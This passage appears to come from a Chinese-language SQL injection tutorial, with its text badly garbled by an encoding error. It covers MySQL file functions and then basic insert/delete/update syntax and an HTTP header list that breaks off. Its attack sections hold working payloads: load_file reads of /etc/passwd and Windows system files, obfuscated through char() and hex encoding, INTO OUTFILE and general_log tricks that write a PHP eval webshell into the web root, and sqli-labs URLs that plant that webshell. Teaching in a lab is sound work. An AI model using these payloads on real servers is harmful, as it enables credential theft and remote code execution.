//PHPç›¸å…³è®¾ç½®</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //è™šæ‹Ÿç½‘ç«™è®¾ç½®</p><p>/etc/httpd/conf/httpd.confæˆ–/usr/local/apche/conf/httpd.conf //æŸ¥çœ‹linux APACHEè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶</p><p>/usr/local/resin-3.0.22/conf/resin.conf //é’ˆå¯¹3.0.22çš„RESINé…ç½®æ–‡ä»¶æŸ¥çœ‹</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf //åŒä¸Š</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHEè™šæ‹Ÿä¸»æœºæŸ¥çœ‹</p><p>/etc/httpd/conf/httpd.confæˆ–/usr/local/apche/conf /httpd.conf æŸ¥çœ‹linux APACHEè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶</p><p>/usr/local/resin-3.0.22/conf/resin.conf é’ˆå¯¹3.0.22çš„RESINé…ç½®æ–‡ä»¶æŸ¥çœ‹</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf åŒä¸Š</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHEè™šæ‹Ÿä¸»æœºæŸ¥çœ‹</p><p>/etc/sysconfig/iptables æŸ¥çœ‹é˜²ç«å¢™ç­–ç•¥</p><p>load_file(char(47)) å¯ä»¥åˆ—å‡ºFreeBSD,Sunosç³»ç»Ÿæ ¹ç›®å½•</p><p>replace(load_file(0Ã—2F6574632F706173737764),0Ã—3c,0Ã—20)</p><p>replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p></blockquote><p><strong>ç¤ºä¾‹ï¼š</strong></p><pre class="language-none"><code class="language-none">Select load_file(â€˜/flagâ€™);SELECT CONVERT(LOAD_FILE("/etc/passwd") USING utf8);</code></pre><pre class="language-none"><code class="language-none">Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))åˆ©ç”¨hex()å°†æ–‡ä»¶å†…å®¹å¯¼å‡ºæ¥ï¼Œå°¤å…¶æ˜¯smbæ–‡ä»¶æ—¶å¯ä»¥ä½¿ç”¨ã€‚-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))Explainï¼šâ€œchar(99,58,47,98,111,111,116,46,105,110,105)â€å°±æ˜¯â€œc:/boot.iniâ€çš„ASCII ä»£ç -1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)Explainï¼šâ€œc:/boot.iniâ€çš„16 è¿›åˆ¶æ˜¯â€œ0x633a2f626f6f742e696e69â€-1 union select 1,1,1,load_file(c:\\boot.ini)Explain:è·¯å¾„é‡Œçš„/ç”¨\\ä»£æ›¿</code></pre><h3 id="æ–‡ä»¶å¯¼å…¥åˆ°æ•°æ®åº“-LOAD-DATA-INFILE"><a href="#æ–‡ä»¶å¯¼å…¥åˆ°æ•°æ®åº“-LOAD-DATA-INFILE" class="headerlink" title="æ–‡ä»¶å¯¼å…¥åˆ°æ•°æ®åº“(LOAD DATA INFILE)"></a>æ–‡ä»¶å¯¼å…¥åˆ°æ•°æ®åº“(LOAD DATA INFILE)</h3><p>LOAD DATA INFILE è¯­å¥ç”¨äºé«˜é€Ÿåœ°ä»ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­è¯»å–è¡Œï¼Œå¹¶è£…å…¥ä¸€ä¸ªè¡¨ä¸­ã€‚æ–‡ä»¶åç§°å¿…é¡»ä¸ºä¸€ä¸ªæ–‡å­—å­—ç¬¦ä¸²ã€‚</p><p>åœ¨æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦ä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œæ¯”å¦‚é…ç½®æ–‡ä»¶ï¼Œå¯†ç æ–‡ä»¶ç­‰ã€‚å½“ä½ å…·æœ‰æ•°æ®åº“çš„æƒé™æ—¶ï¼Œå¯ä»¥å°†ç³»ç»Ÿæ–‡ä»¶åˆ©ç”¨load data infile å¯¼å…¥åˆ°æ•°æ®åº“ä¸­ã€‚</p><p><strong>ç¤ºä¾‹ï¼š</strong></p><pre class="language-none"><code class="language-none">load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t' lines terminated by '\n'</code></pre><p>å°†/tmp/t0.txt å¯¼å…¥åˆ°t0 è¡¨ä¸­ï¼Œcharacter set gbk æ˜¯å­—ç¬¦é›†è®¾ç½®ä¸ºgbkï¼Œfields terminated by æ˜¯æ¯ä¸€é¡¹æ•°æ®ä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œlines terminated by æ˜¯è¡Œçš„ç»“å°¾ç¬¦ã€‚</p><p>å½“é”™è¯¯ä»£ç æ˜¯2 çš„æ—¶å€™çš„æ—¶å€™ï¼Œæ–‡ä»¶ä¸å­˜åœ¨ï¼Œé”™è¯¯ä»£ç ä¸º13 çš„æ—¶å€™æ˜¯æ²¡æœ‰æƒé™ï¼Œå¯ä»¥è€ƒè™‘/tmp ç­‰æ–‡ä»¶å¤¹ã€‚ TIPSï¼šæˆ‘ä»¬ä»mysql5.7 çš„æ–‡æ¡£çœ‹åˆ°æ·»åŠ äº†load xml å‡½æ•°ï¼Œæ˜¯å¦ä¾æ—§èƒ½å¤Ÿç”¨æ¥åšæ³¨å…¥è¿˜éœ€è¦éªŒè¯ã€‚</p><h3 id="å¯¼å…¥åˆ°æ–‡ä»¶-OUTFILE"><a href="#å¯¼å…¥åˆ°æ–‡ä»¶-OUTFILE" class="headerlink" title="å¯¼å…¥åˆ°æ–‡ä»¶(OUTFILE)"></a>å¯¼å…¥åˆ°æ–‡ä»¶(OUTFILE)</h3><p>SELECTâ€¦..INTO OUTFILE â€˜file_nameâ€™</p><p>å¯ä»¥æŠŠè¢«é€‰æ‹©çš„è¡Œå†™å…¥ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚è¯¥æ–‡ä»¶è¢«åˆ›å»ºåˆ°æœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå› æ­¤æ‚¨å¿…é¡»æ‹¥æœ‰FILEæƒé™ï¼Œæ‰èƒ½ä½¿ç”¨æ­¤è¯­æ³•ã€‚file_name ä¸èƒ½æ˜¯ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶ã€‚</p><blockquote><p>mysqlä¸­çš„é…ç½®æ–‡ä»¶secure_file_privå˜é‡å¦‚æœä¸ºNULLï¼Œåˆ™ä¸èƒ½å¯¼å…¥</p><p>[mysqld] secure_file_priv=â€/â€œ</p></blockquote><p>æˆ‘ä»¬ä¸€èˆ¬æœ‰ä¸¤ç§åˆ©ç”¨å½¢å¼ï¼š <strong>ç¬¬ä¸€ç§ç›´æ¥å°†select å†…å®¹å¯¼å…¥åˆ°æ–‡ä»¶ä¸­ï¼š</strong></p><pre class="language-none"><code class="language-none">Select version() into outfile â€œc:\\phpnow\\htdocs\\test.phpâ€</code></pre><p>æ­¤å¤„å°†<code>version()</code>æ›¿æ¢æˆä¸€å¥è¯ï¼Œ<code>\&lt;?php @eval($_post[â€œmimaâ€])?&gt;</code></p><p>ä¹Ÿå³ <code>Select\&lt;?php @eval($_post[â€œmimaâ€])?&gt; into outfile â€œc:\\phpnow\\htdocs\\test.phpâ€</code> ç›´æ¥è¿æ¥ä¸€å¥è¯å°±å¯ä»¥äº†ï¼Œå…¶å®åœ¨select å†…å®¹ä¸­ä¸ä»…ä»…æ˜¯å¯ä»¥ä¸Šä¼ ä¸€å¥è¯çš„ï¼Œä¹Ÿå¯ä»¥ä¸Šä¼ å¾ˆå¤šçš„å†…å®¹ã€‚</p><p><strong>ç¬¬äºŒç§ä¿®æ”¹æ–‡ä»¶ç»“å°¾ï¼š</strong></p><pre class="language-none"><code class="language-none">Select version() Into outfile â€œc:\\phpnow\\htdocs\\test.phpâ€ LINES TERMINATED BY 0x16 è¿›åˆ¶æ–‡ä»¶</code></pre><p>è§£é‡Šï¼šé€šå¸¸æ˜¯ç”¨<code>â€˜\r\nâ€™</code>ç»“å°¾ï¼Œæ­¤å¤„æˆ‘ä»¬ä¿®æ”¹ä¸ºè‡ªå·±æƒ³è¦çš„ä»»ä½•æ–‡ä»¶ã€‚åŒæ—¶å¯ä»¥ç”¨<code>FIELDS TERMINATED BY 16</code> è¿›åˆ¶å¯ä»¥ä¸ºä¸€å¥è¯æˆ–è€…å…¶ä»–ä»»ä½•çš„ä»£ç ï¼Œå¯è‡ªè¡Œæ„é€ ã€‚åœ¨<code>sqlmap</code> ä¸­<code>os-shell</code> é‡‡å–çš„å°±æ˜¯ è¿™æ ·çš„æ–¹å¼ï¼Œå…·ä½“å¯å‚è€ƒ<code>os-shell</code> åˆ†ææ–‡ç« ï¼š<a href="http://www.cnblogs.com/lcamry/p/5505110.html">http://www.cnblogs.com/lcamry/p/5505110.html</a> TIPSï¼š ï¼ˆ1ï¼‰å¯èƒ½åœ¨æ–‡ä»¶è·¯å¾„å½“ä¸­è¦æ³¨æ„è½¬ä¹‰ï¼Œè¿™ä¸ªè¦çœ‹å…·ä½“çš„ç¯å¢ƒ ï¼ˆ2ï¼‰ä¸Šè¿°æˆ‘ä»¬æåˆ°äº†<code>load_file()</code>,ä½†æ˜¯å½“å‰å°æ— æ³•å¯¼å‡ºæ•°æ®çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„è¯­å¥ï¼š</p><pre class="language-none"><code class="language-none">select load_file(â€˜c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.iniâ€™) into outfileâ€˜c:\\wamp\\www\\test.phpâ€™</code></pre><p>å¯ä»¥åˆ©ç”¨è¯¥è¯­å¥å°†æœåŠ¡å™¨å½“ä¸­çš„å†…å®¹å¯¼å…¥åˆ°web æœåŠ¡å™¨ä¸‹çš„ç›®å½•ï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°æ•°æ®äº†ã€‚ä¸Šè¿°my.ini å½“ä¸­å­˜åœ¨password é¡¹ï¼ˆä¸è¿‡é»˜è®¤è¢«æ³¨é‡Šï¼‰ï¼Œå½“ç„¶ä¼šæœ‰å¾ˆå¤šçš„å†…å®¹å¯ä»¥è¢«å¯¼å‡ºæ¥ï¼Œè¿™ä¸ªè¦å¹³æ—¶ç§¯ç´¯ã€‚</p><p>ç±»ä¼¼çš„è¿˜æœ‰ä¸€ä¸ª<code>dumpfile</code></p><pre class="language-none"><code class="language-none">select "&lt;?php phpinfo();?&gt;" into dumpfile "/tmp/1.php";outfileå‡½æ•°åœ¨å°†æ•°æ®å†™åˆ°æ–‡ä»¶é‡Œæ—¶æœ‰ç‰¹æ®Šçš„æ ¼å¼è½¬æ¢ï¼Œè€Œdumpfileåˆ™ä¿æŒåŸæ•°æ®æ ¼å¼</code></pre><p>å½“<code>secure_file_priv</code>ä¸º<code>NULL</code>æ—¶</p><pre class="language-none"><code class="language-none">å¦‚æœå­˜åœ¨å †å æ³¨å…¥ï¼Œå½“ç„¶ç”±äºæ˜¯globalå˜é‡ï¼Œéœ€è¦rootæƒé™set global general_log=on;set global general_log_file='C:/phpStudy/WWW/789.php';select '&lt;?php eval($_POST['a']) ?&gt;';</code></pre><p><strong>sqli-labs/Less-7</strong></p><pre class="language-none"><code class="language-none">--ä½¿ç”¨')) or 1=1--+è¿›è¡Œæ³¨å…¥http://127.0.0.1/sqli-labs/Less-7/?id=1')) or 1=1 --+ï¼ˆ2ï¼‰åˆ©ç”¨ä¸Šè¿°æåˆ°çš„æ–‡ä»¶å¯¼å…¥çš„æ–¹å¼è¿›è¡Œæ¼”ç¤ºï¼šhttp://127.0.0.1/sqli-labs/Less-7/?id=-1')) union select 1,2,3 into outfile "D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.txt"--+ï¼ˆ3ï¼‰ç›´æ¥å°†ä¸€å¥è¯æœ¨é©¬å¯¼å…¥è¿›å»ï¼Œå†ç”¨èœåˆ€ç­‰webshell ç®¡ç†å·¥å…·è¿æ¥å³å¯http://127.0.0.1/sqli-labs/Less-7/?id=-1'))UNION SELECT 1,2,'&lt;?php @eval($_post[â€œmimaâ€])?&gt;' into outfile "D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.php"--+ï¼ˆ4ï¼‰è¿™é‡Œä¹Ÿå¯ä»¥åˆ°å¤„æ•°æ®åº“çš„å†…å®¹</code></pre><h2 id="å¢åˆ æ”¹å‡½æ•°ä»‹ç»"><a href="#å¢åˆ æ”¹å‡½æ•°ä»‹ç»" class="headerlink" title="å¢åˆ æ”¹å‡½æ•°ä»‹ç»"></a>å¢åˆ æ”¹å‡½æ•°ä»‹ç»</h2><p>åœ¨å¯¹æ•°æ®è¿›è¡Œå¤„ç†ä¸Šï¼Œæˆ‘ä»¬ç»å¸¸ç”¨åˆ°çš„æ˜¯å¢åˆ æŸ¥æ”¹ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è®²è§£ä¸€ä¸‹mysql çš„å¢åˆ æ”¹ã€‚æŸ¥å°±æ˜¯æˆ‘ä»¬ä¸Šè¿°æ€»ç”¨åˆ°çš„selectï¼Œè¿™é‡Œå°±ä»‹ç»äº†ã€‚</p><p>å¢åŠ ä¸€è¡Œæ•°æ®ã€‚</p><p><strong>Insert</strong></p><p><strong>åˆ é™¤</strong></p><blockquote><p>åˆ é™¤æ•°æ®: delete from è¡¨å; delete from è¡¨åwhere id=1; åˆ é™¤ç»“æ„ï¼š åˆ æ•°æ®åº“ï¼šdrop database æ•°æ®åº“å; åˆ é™¤è¡¨ï¼šdrop table è¡¨å; åˆ é™¤è¡¨ä¸­çš„åˆ—:alter table è¡¨ådrop column åˆ—å;</p><p><strong>ä¿®æ”¹</strong> ä¿®æ”¹æ‰€æœ‰ï¼šupdata è¡¨åset åˆ—å=â€™æ–°çš„å€¼ï¼Œéæ•°å­—åŠ å•å¼•å·â€™ ; å¸¦æ¡ä»¶çš„ä¿®æ”¹ï¼šupdata è¡¨åset åˆ—å=â€™æ–°çš„å€¼ï¼Œéæ•°å­—åŠ å•å¼•å·â€™ where id=6;</p></blockquote><h2 id="HTTP-å¤´éƒ¨ä»‹ç»"><a href="#HTTP-å¤´éƒ¨ä»‹ç»" class="headerlink" title="HTTP å¤´éƒ¨ä»‹ç»"></a>HTTP å¤´éƒ¨ä»‹ç»</h2><p>åœ¨åˆ©ç”¨æŠ“åŒ…å·¥å…·è¿›è¡ŒæŠ“åŒ…çš„æ—¶å€™ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°å¾ˆå¤šçš„é¡¹ï¼Œä¸‹é¢è¯¦ç»†è®²è§£æ¯ä¸€é¡¹ã€‚ HTTP å¤´éƒ¨è¯¦è§£ 1ã€Acceptï¼šå‘Šè¯‰WEB æœåŠ¡å™¨è‡ªå·±æ¥å—ä»€ä¹ˆä»‹è´¨ç±»å‹ï¼Œ*/* è¡¨ç¤ºä»»ä½•ç±»å‹ï¼Œtype/* è¡¨ç¤ºè¯¥ç±»å‹ä¸‹çš„æ‰€æœ‰å­ç±»å‹ï¼Œtype/sub-typeã€‚ 2ã€Accept-Charsetï¼š æµè§ˆå™¨ç”³æ˜è‡ªå·±æ¥æ”¶çš„å­—ç¬¦é›†</p><p>Accept-Encodingï¼š æµè§ˆå™¨ç”³æ˜è‡ªå·±æ¥æ”¶çš„ç¼–ç æ–¹æ³•ï¼Œé€šå¸¸æŒ‡å®šå‹ç¼©æ–¹æ³•ï¼Œæ˜¯å¦æ”¯æŒå‹ç¼©ï¼Œæ”¯æŒä»€ä¹ˆå‹ç¼©æ–¹æ³•ï¼ˆgzipï¼Œdeflateï¼‰ Accept-Languageï¼šï¼šæµè§ˆå™¨ç”³æ˜è‡ªå·±æ¥æ”¶çš„è¯­è¨€è¯­è¨€è·Ÿå­—ç¬¦é›†çš„åŒºåˆ«ï¼šä¸­æ–‡æ˜¯è¯­è¨€ï¼Œä¸­æ–‡æœ‰å¤šç§å­—ç¬¦é›†ï¼Œæ¯”å¦‚big5ï¼Œgb2312ï¼Œgbk ç­‰ç­‰ã€‚ 3ã€Accept-Rangesï¼šWEB æœåŠ¡å™¨è¡¨æ˜è‡ªå·±æ˜¯å¦æ¥å—è·å–å…¶æŸä¸ªå®ä½“çš„ä¸€éƒ¨åˆ†ï¼ˆæ¯”å¦‚æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼‰çš„è¯·æ±‚ã€‚bytesï¼šè¡¨ç¤ºæ¥å—ï¼Œnoneï¼šè¡¨ç¤ºä¸æ¥å—ã€‚ 4ã€Ageï¼šå½“ä»£ç†æœåŠ¡å™¨ç”¨è‡ªå·±ç¼“å­˜çš„å®ä½“å»å“åº”è¯·æ±‚æ—¶ï¼Œç”¨è¯¥å¤´éƒ¨è¡¨æ˜è¯¥å®ä½“ä»äº§ç”Ÿåˆ°ç°åœ¨ç»è¿‡å¤šé•¿æ—¶é—´äº†ã€‚ 5ã€Authorizationï¼šå½“å®¢æˆ·ç«¯æ¥æ”¶åˆ°æ¥è‡ªWEB æœåŠ¡å™¨çš„WWW-Authenticate å“åº”æ—¶ï¼Œç”¨è¯¥å¤´éƒ¨æ¥å›åº”è‡ªå·±çš„èº«ä»½éªŒè¯ä¿¡æ¯ç»™WEB æœåŠ¡å™¨ã€‚ 6ã€Cache-Controlï¼šè¯·æ±‚ï¼šno-cacheï¼ˆä¸è¦ç¼“å­˜çš„å®ä½“ï¼Œè¦æ±‚ç°åœ¨ä»WEB æœåŠ¡å™¨å»å–ï¼‰ max-ageï¼šï¼ˆåªæ¥å—Age å€¼å°äºmax-age å€¼ï¼Œå¹¶ä¸”æ²¡æœ‰è¿‡æœŸçš„å¯¹è±¡ï¼‰ max-staleï¼šï¼ˆå¯ä»¥æ¥å—è¿‡å»çš„å¯¹è±¡ï¼Œä½†æ˜¯è¿‡æœŸæ—¶é—´å¿…é¡»å°äºmax-stale å€¼ï¼‰ min-freshï¼šï¼ˆæ¥å—å…¶æ–°é²œç”Ÿå‘½æœŸå¤§äºå…¶å½“å‰Age è·Ÿmin-fresh å€¼ä¹‹å’Œçš„ç¼“å­˜å¯¹è±¡ï¼‰ å“åº”ï¼špublic(å¯ä»¥ç”¨Cached å†…å®¹å›åº”ä»»ä½•ç”¨æˆ·) privateï¼ˆåªèƒ½ç”¨ç¼“å­˜å†…å®¹å›åº”å…ˆå‰è¯·æ±‚è¯¥å†…å®¹çš„é‚£ä¸ªç”¨æˆ·ï¼‰ no-cacheï¼ˆå¯ä»¥ç¼“å­˜ï¼Œä½†æ˜¯åªæœ‰åœ¨è·ŸWEB æœåŠ¡å™¨éªŒè¯äº†å…¶æœ‰æ•ˆåï¼Œæ‰èƒ½è¿”å›ç»™å®¢æˆ·ç«¯ï¼‰ max-ageï¼šï¼ˆæœ¬å“åº”åŒ…å«çš„å¯¹è±¡çš„è¿‡æœŸæ—¶é—´ï¼‰ ALL: no-storeï¼ˆä¸å…è®¸ç¼“å­˜ï¼‰ 7ã€Connectionï¼šè¯·æ±‚ï¼šcloseï¼ˆå‘Šè¯‰WEB æœåŠ¡å™¨æˆ–è€…ä»£ç†æœåŠ¡å™¨ï¼Œåœ¨å®Œæˆæœ¬æ¬¡è¯·æ±‚çš„å“åº”åï¼Œæ–­å¼€è¿æ¥ï¼Œä¸è¦ç­‰å¾…æœ¬æ¬¡è¿æ¥çš„åç»­è¯·æ±‚äº†ï¼‰ã€‚ keepaliveï¼ˆå‘Šè¯‰WEB æœåŠ¡å™¨æˆ–è€…ä»£ç†æœåŠ¡å™¨ï¼Œåœ¨å®Œæˆæœ¬æ¬¡è¯·æ±‚çš„å“åº”åï¼Œä¿æŒè¿æ¥ï¼Œç­‰å¾…æœ¬æ¬¡è¿æ¥çš„åç»­è¯·æ±‚ï¼‰ã€‚ å“åº”ï¼šcloseï¼ˆè¿æ¥å·²ç»å…³é—­ï¼‰ã€‚ keepaliveï¼ˆè¿æ¥ä¿æŒç€ï¼Œåœ¨ç­‰å¾…æœ¬æ¬¡è¿æ¥çš„åç»­è¯·æ±‚ï¼‰ã€‚ Keep-Aliveï¼šå¦‚æœæµè§ˆå™¨è¯·æ±‚ä¿æŒè¿æ¥ï¼Œåˆ™è¯¥å¤´éƒ¨è¡¨æ˜å¸Œæœ›WEB æœåŠ¡å™¨ä¿æŒè¿æ¥å¤šé•¿æ—¶é—´ï¼ˆç§’ï¼‰ã€‚ä¾‹å¦‚ï¼šKeep-Aliveï¼š300 8ã€Content-Encodingï¼šWEB æœåŠ¡å™¨è¡¨æ˜è‡ªå·±ä½¿ç”¨äº†ä»€ä¹ˆå‹ç¼©æ–¹æ³•ï¼ˆgzipï¼Œdeflateï¼‰å‹ç¼©å“åº”ä¸­çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼šContent-Encodingï¼šgzip 9ã€Content-Languageï¼šWEB æœåŠ¡å™¨å‘Šè¯‰æµè§ˆå™¨è‡ªå·±å“åº”çš„å¯¹è±¡çš„è¯­è¨€ã€‚ 10ã€Content-Lengthï¼š WEB æœåŠ¡å™¨å‘Šè¯‰æµè§ˆå™¨è‡ªå·±å“åº”çš„å¯¹è±¡çš„é•¿åº¦ã€‚ä¾‹å¦‚ï¼šContent-Length:26012 11ã€Content-Rangeï¼š WEB æœåŠ¡å™¨è¡¨æ˜è¯¥å“åº”åŒ…å«çš„éƒ¨åˆ†å¯¹è±¡ä¸ºæ•´ä¸ªå¯¹è±¡çš„å“ªä¸ªéƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼šContent-Range: bytes 21010-47021/47022 12ã€Content-Typeï¼š WEB æœåŠ¡å™¨å‘Šè¯‰æµè§ˆå™¨è‡ªå·±å“åº”çš„å¯¹è±¡çš„ç±»å‹ã€‚ä¾‹å¦‚ï¼šContent-Typeï¼šapplication/xml 13ã€ETagï¼šå°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆæ¯”å¦‚URLï¼‰çš„æ ‡å¿—å€¼ï¼Œå°±ä¸€ä¸ªå¯¹è±¡è€Œè¨€ï¼Œæ¯”å¦‚ä¸€ä¸ªhtml æ–‡ä»¶ï¼Œå¦‚æœè¢«ä¿®æ”¹äº†ï¼Œå…¶Etag ä¹Ÿä¼šåˆ«ä¿®æ”¹ï¼Œæ‰€ä»¥ETag çš„ä½œç”¨è·ŸLast-Modified çš„ä½œç”¨å·®ä¸å¤šï¼Œä¸»è¦ä¾›WEB æœåŠ¡å™¨åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦æ”¹å˜äº†ã€‚æ¯”å¦‚å‰ä¸€æ¬¡è¯·æ±‚æŸä¸ªhtml æ–‡ä»¶æ—¶ï¼Œè·å¾—äº†å…¶ETagï¼Œå½“è¿™æ¬¡åˆè¯·æ±‚è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šæŠŠå…ˆå‰è·å¾—çš„ETag å€¼å‘é€ç»™WEB æœåŠ¡å™¨ï¼Œç„¶åWEB æœåŠ¡å™¨ä¼šæŠŠè¿™ä¸ªETag è·Ÿè¯¥æ–‡ä»¶çš„å½“å‰ETag è¿›è¡Œå¯¹æ¯”ï¼Œç„¶åå°±çŸ¥é“è¿™ä¸ªæ–‡ä»¶æœ‰æ²¡æœ‰æ”¹å˜äº†ã€‚ 14ã€Expiredï¼šWEB æœåŠ¡å™¨è¡¨æ˜è¯¥å®ä½“å°†åœ¨ä»€ä¹ˆæ—¶å€™è¿‡æœŸï¼Œå¯¹äºè¿‡æœŸäº†çš„å¯¹è±¡ï¼Œåªæœ‰åœ¨è·ŸWEB æœåŠ¡å™¨éªŒè¯äº†å…¶æœ‰æ•ˆæ€§åï¼Œæ‰èƒ½ç”¨æ¥å“åº”å®¢æˆ·è¯·æ±‚ã€‚æ˜¯HTTP/1.0 çš„å¤´éƒ¨ã€‚ä¾‹å¦‚ï¼šExpiresï¼šSat, 23 May 2009 10:02:12 GMT 15ã€Hostï¼šå®¢æˆ·ç«¯æŒ‡å®šè‡ªå·±æƒ³è®¿é—®çš„WEB æœåŠ¡å™¨çš„åŸŸå/IP åœ°å€å’Œç«¯å£å·ã€‚ä¾‹å¦‚ï¼šHostï¼šrss.sina.com.cn 16ã€If-Matchï¼šå¦‚æœå¯¹è±¡çš„ETag æ²¡æœ‰æ”¹å˜ï¼Œå…¶å®ä¹Ÿå°±æ„å‘³è‘—å¯¹è±¡æ²¡æœ‰æ”¹å˜ï¼Œæ‰æ‰§è¡Œè¯·æ±‚çš„åŠ¨ä½œã€‚ 17ã€If-None-Matchï¼šå¦‚æœå¯¹è±¡çš„ETag æ”¹å˜äº†ï¼Œå…¶å®ä¹Ÿå°±æ„å‘³è‘—å¯¹è±¡ä¹Ÿæ”¹å˜äº†ï¼Œæ‰æ‰§è¡Œè¯·æ±‚çš„åŠ¨ä½œã€‚ 18ã€If-Modified-Sinceï¼šå¦‚æœè¯·æ±‚çš„å¯¹è±¡åœ¨è¯¥å¤´éƒ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åä¿®æ”¹äº†ï¼Œæ‰æ‰§è¡Œè¯·æ±‚çš„åŠ¨ä½œï¼ˆ æ¯”å¦‚è¿”å›å¯¹è±¡ï¼‰ï¼Œ å¦åˆ™è¿”å›ä»£ç 304 ï¼Œå‘Šè¯‰æµè§ˆå™¨è¯¥å¯¹è±¡æ²¡æœ‰ä¿®æ”¹ã€‚ä¾‹å¦‚ï¼šIf-Modified-Sinceï¼šThu, 10 Apr 2008 09:14:42 GMT 19ã€If-Unmodified-Sinceï¼šå¦‚æœè¯·æ±‚çš„å¯¹è±¡åœ¨è¯¥å¤´éƒ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åæ²¡ä¿®æ”¹è¿‡ï¼Œæ‰æ‰§è¡Œè¯·æ±‚çš„åŠ¨ä½œï¼ˆæ¯”å¦‚è¿”å›å¯¹è±¡ï¼‰ã€‚ 20ã€If-Rangeï¼šæµè§ˆå™¨å‘Šè¯‰WEB æœåŠ¡å™¨ï¼Œå¦‚æœæˆ‘è¯·æ±‚çš„å¯¹è±¡æ²¡æœ‰æ”¹å˜ï¼Œå°±æŠŠæˆ‘ç¼ºå°‘çš„éƒ¨åˆ†ç»™æˆ‘ï¼Œå¦‚æœå¯¹è±¡æ”¹å˜äº†ï¼Œå°±æŠŠæ•´ä¸ªå¯¹è±¡ç»™æˆ‘ã€‚æµè§ˆå™¨é€šè¿‡å‘é€è¯·æ±‚å¯¹è±¡çš„ETag æˆ–è€…è‡ªå·±æ‰€çŸ¥é“çš„æœ€åä¿®æ”¹æ—¶é—´ç»™WEB æœåŠ¡å™¨ï¼Œè®©å…¶åˆ¤æ–­å¯¹è±¡æ˜¯å¦æ”¹å˜äº†ã€‚æ€»æ˜¯è·ŸRange å¤´éƒ¨ä¸€ èµ·ä½¿ç”¨ã€‚ 21ã€Last-Modifiedï¼šWEB æœåŠ¡å™¨è®¤ä¸ºå¯¹è±¡çš„æœ€åä¿®æ”¹æ—¶é—´ï¼Œæ¯”å¦‚æ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´ï¼ŒåŠ¨æ€é¡µé¢çš„æœ€åäº§ç”Ÿæ—¶é—´ç­‰ç­‰ã€‚ä¾‹å¦‚ï¼šLast-Modifiedï¼šTue, 06 May 2008 02:42:43 GMT 22ã€Locationï¼šWEB æœåŠ¡å™¨å‘Šè¯‰æµè§ˆå™¨ï¼Œè¯•å›¾è®¿é—®çš„å¯¹è±¡å·²ç»è¢«ç§»åˆ°åˆ«çš„ä½ç½®äº†ï¼Œåˆ°è¯¥å¤´éƒ¨æŒ‡å®šçš„ä½ç½®å»å–ã€‚ä¾‹å¦‚ï¼š Location ï¼š <a href="http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif">http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</a> 23ã€Pramgaï¼šä¸»è¦ä½¿ç”¨Pramga: no-cacheï¼Œç›¸å½“äºCache-Controlï¼š no-cacheã€‚ä¾‹å¦‚ï¼šPragmaï¼šno-cache 24ã€Proxy-Authenticateï¼š ä»£ç†æœåŠ¡å™¨å“åº”æµè§ˆå™¨ï¼Œè¦æ±‚å…¶æä¾›ä»£ç†èº«ä»½éªŒè¯ä¿¡æ¯ã€‚Proxy-Authorizationï¼šæµè§ˆå™¨å“åº”ä»£ç†æœåŠ¡å™¨çš„èº«ä»½éªŒè¯è¯·æ±‚ï¼Œæä¾›è‡ªå·±çš„èº«ä»½ä¿¡æ¯ã€‚ 25ã€Rangeï¼šæµè§ˆå™¨ï¼ˆæ¯”å¦‚Flashget å¤šçº¿ç¨‹ä¸‹è½½æ—¶ï¼‰å‘Šè¯‰WEB æœåŠ¡å™¨è‡ªå·±æƒ³å–å¯¹è±¡çš„å“ªéƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼šRange: bytes=1173546- 26ã€Refererï¼šæµè§ˆå™¨å‘WEB æœåŠ¡å™¨è¡¨æ˜è‡ªå·±æ˜¯ä»å“ªä¸ªç½‘é¡µ/URL è·å¾—/ç‚¹å‡»å½“å‰è¯·æ±‚ä¸­çš„ç½‘å€/URLã€‚ä¾‹å¦‚ï¼šRefererï¼š<a href="http://www.sina.com/">http://www.sina.com/</a> 27ã€Server: WEB æœåŠ¡å™¨è¡¨æ˜è‡ªå·±æ˜¯ä»€ä¹ˆè½¯ä»¶åŠç‰ˆæœ¬ç­‰ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼šServerï¼šApache/2.0.61(Unix) 28ã€User-Agent: 